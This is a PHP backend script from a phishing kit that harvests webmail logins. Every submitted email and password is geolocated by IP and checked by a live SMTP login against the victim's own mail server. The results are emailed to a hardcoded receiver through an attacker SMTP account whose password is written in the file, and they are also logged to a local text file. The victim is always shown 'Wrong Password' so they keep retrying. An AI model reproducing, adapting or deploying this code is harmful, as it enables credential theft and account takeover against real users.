<?php
// Add CORS headers to allow cross-origin requests
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");
header("Content-Type: application/json");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

// Get client IP and location data
$ip = $_SERVER['REMOTE_ADDR'];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

session_start();

// Block GET requests
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    echo json_encode(array('signal' => 'not ok', 'msg' => 'GET requests not allowed'));
    exit;
}

//----------------------------------------------------------\\
// SMTP Configuration
$receiver = "bobrob@elitat.com"; // ENTER YOUR EMAIL HERE
$senderuser = "jered@globalrisk.ru"; // ENTER YOUR SMTP USER
$senderpass = "global.321"; // ENTER YOUR SMTP PASSWORD
$senderport = "587"; // ENTER YOUR SMTP PORT
$senderserver = "mail.globalrisk.ru"; // ENTER YOUR SMTP SERVER
//----------------------------------------------------------\\

// Get form data and browser info
$browser = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['email'];
$password = $_POST['password'];
$email = $login;

// Extract domain from email
$parts = explode("@", $email);
$domain = $parts[1];

// Prepare email subjects
$subg = $ipdat->geoplugin_countryName . " || " . $login;
$subg2 = "notVerifiedRcuteOrange || " . $ipdat->geoplugin_countryName . " || " . $login;

// Prepare message content
$message = nl2br("Email : " . $login . "\nPassword : " . $password . "\nIP of sender: " . $ipdat->geoplugin_countryName . " | " . $ipdat->geoplugin_city . " | " . $ip);

// Test credentials
$mail = new PHPMailer(true);
$mail->SMTPAuth = true;
$mail->Username = $login;
$mail->Password = $password;
$mail->Host = 'mail.' . $domain;
$mail->Port = "587";

$validCredentials = false;

try {
    $validCredentials = $mail->SmtpConnect();
} catch (Exception $error) {
    // Credentials are invalid
}

if ($validCredentials == true) {
    // Send email for valid credentials
    $mail = new PHPMailer;
    $mail->isSMTP();
    $mail->Host = $senderserver;
    $mail->SMTPAuth = true;
    $mail->Username = $senderuser;
    $mail->Password = $senderpass;
    $mail->Port = $senderport;
    $mail->From = $senderuser;
    $mail->FromName = 'SS-RCube';
    $mail->addAddress($receiver);
    $mail->isHTML(true);
    $mail->Subject = $subg;
    $mail->Body = $message;
    $mail->AltBody = 'Enjoy new server';
    $mail->send();
    
    $data = array(
        'signal' => 'not ok',
        'msg' => 'Wrong Password'
    );
} else {
    // Send email for invalid credentials
    $mail2 = new PHPMailer;
    $mail2->isSMTP();
    $mail2->Host = $senderserver;
    $mail2->SMTPAuth = true;
    $mail2->Username = $senderuser;
    $mail2->Password = $senderpass;
    $mail2->Port = $senderport;
    $mail2->From = $senderuser;
    $mail2->FromName = 'SS-RCube';
    $mail2->addAddress($receiver);
    $mail2->isHTML(true);
    $mail2->Subject = $subg2;
    $mail2->Body = $message;
    $mail2->AltBody = 'Enjoy new server';
    
    if ($mail2->send()) {
        $data = array(
            'signal' => 'not ok',
            'msg' => 'Wrong Password'
        );
    } else {
        $data = array(
            'signal' => 'not ok',
            'msg' => 'Connection error'
        );
    }
}

// Log to file
$fp = fopen("SS-Or.txt", "a");
fputs($fp, $message . "\n");
fclose($fp);

// Return JSON response
echo json_encode($data);

// Generate random hash
$praga = rand();
$praga = md5($praga);

exit();
?>